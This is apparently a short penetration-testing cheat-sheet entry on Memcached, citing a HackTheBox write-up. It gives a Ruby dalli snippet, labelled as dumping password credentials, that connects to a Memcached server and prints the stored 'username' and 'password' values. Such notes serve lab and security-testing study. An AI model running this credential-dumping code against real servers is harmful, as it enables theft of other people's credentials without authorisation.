# Memcached

> Memcached \(pronounced variously mem-cash-dee or mem-cashed\) is a general-purpose distributed memory-caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source \(such as a database or API\) must be read.

Ref. [Wikipedia](https://en.wikipedia.org/wiki/Memcached)

## Client

### With dalli

Gem: [dalli](https://rubygems.org/gems/dalli)

Dump passwords credentials from Memcached:

```ruby
require 'dalli'

options = { username: 'usertest', password: 'passwordtest' }
dc = Dalli::Client.new('example.org:11211', options)

usernames = dc.get('username')
puts "Usernames:\n#{usernames}"

passwords = dc.get('password')
puts "\nPasswords:\n#{passwords}"
```

Ref. [Rawsec - Dyplesher - Write-up - HackTheBox](https://blog.raw.pm/en/HackTheBox-Dyplesher-write-up/#memcache-exploitation)

